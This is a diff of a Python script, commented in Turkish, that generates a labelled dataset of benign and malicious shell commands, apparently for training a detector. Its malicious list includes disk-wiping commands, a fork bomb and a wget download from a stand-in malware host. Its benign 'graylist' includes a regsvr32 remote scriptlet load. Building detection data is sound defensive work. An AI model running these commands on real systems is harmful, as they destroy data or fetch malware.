@@ -2,9 +2,9 @@ import pandas as pd
 import random
 
 def generate_dataset(size=10000):
-    
+    """Gelişmiş veri seti üretici - False Positive azaltılmış versiyon."""
 
-    
+    # Benign komutlar (genişletildi)
     benign_templates = [
         "ls -la", "pwd", "whoami", "date", "uptime", "ps aux", "df -h", "free -m",
         "cat /etc/passwd", "grep pattern file.txt", "find /home -name '*.txt'",
@@ -29,7 +29,7 @@ def generate_dataset(size=10000):
         "passwd user", "useradd newuser", "usermod -aG sudo user", "userdel olduser"
     ]
 
-   
+    # LOLBAS "graylist" komutları benign olarak ekleniyor
     graylist_commands = [
         "regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll",
         "csc -target:library file.cs",
@@ -39,7 +39,7 @@ def generate_dataset(size=10000):
     ]
     benign_templates.extend(graylist_commands)
 
-    
+    # Zararlı komutlar
     malicious_templates = [
         "rm -rf /", ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda",
         "mkfs.ext4 /dev/sda1", "wget http://malicious.com/malware.exe",
@@ -74,7 +74,7 @@ def generate_dataset(size=10000):
 
     data = []
 
-    
+    # Benign veriler
     for _ in range(size // 2):
         cmd = random.choice(benign_templates)
         if random.random() < 0.3:
@@ -89,7 +89,7 @@ def generate_dataset(size=10000):
             cmd = random.choice(variations)
         data.append({"command": cmd, "label": "benign"})
 
-    
+    # Zararlı veriler
     for _ in range(size // 2):
         cmd = random.choice(malicious_templates)
         if random.random() < 0.3:
